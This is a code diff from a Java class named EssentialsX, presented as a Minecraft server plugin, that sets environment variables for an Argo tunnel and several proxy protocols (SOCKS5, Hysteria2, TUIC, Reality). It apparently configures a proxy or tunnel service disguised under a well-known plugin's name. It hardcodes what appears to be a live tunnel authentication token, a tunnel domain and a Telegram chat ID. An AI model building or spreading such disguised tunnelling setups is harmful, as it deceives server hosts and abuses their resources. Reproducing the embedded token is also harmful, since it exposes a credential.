@@ -81,11 +81,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "freenl.5785787.xyz");
         env.put("ARGO_AUTH", "eyJhIjoiNjVmMDUzZTNjYzM4Y2JiNTgwZWJlYjM3YTQzMzU4NWMiLCJ0IjoiY2Y4ZDUzNTMtZjAzNy00ZmI5LWE0NmYtNTAwMTc0ZDA4NDk0IiwicyI6Ik1EUXdZekZpWmpZdFpqaGhNeTAwTm1NeUxXRmxPRFF0TXpZeU56RTBaV1l5WldZMSJ9");
-        env.put("S5_PORT", "10808");
+        env.put("S5_PORT", "");
         env.put("HY2_PORT", "8787");
-        env.put("TUIC_PORT", "");
+        env.put("TUIC_PORT", "10808");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "10808");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "6408048903");
